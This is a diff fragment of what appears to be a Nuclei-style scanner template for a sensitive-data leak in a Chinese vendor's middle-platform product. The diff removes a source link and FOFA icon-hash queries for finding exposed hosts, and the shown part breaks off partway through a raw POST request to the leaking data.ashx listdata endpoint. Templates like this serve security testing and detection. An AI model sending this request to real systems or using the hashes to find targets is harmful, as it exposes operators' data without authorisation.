@@ -3,12 +3,8 @@ info:
   name: 山东聚恒网络技术有限公司聚恒中台listdata存在敏感信息泄露
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ma95tqoq4vckofqn'
+  description: ''
   tags: info-leak,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ma95tqoq4vckofqn
-    fofa: icon_hash="-2049533275" || icon_hash="-737808640" || icon_hash="-1557056363"
 http:
 - raw:
   - 'POST /sysplat/dataget/data.ashx?type=listdata&typeid=bs_webapiauthlist&listkey= HTTP/1.1
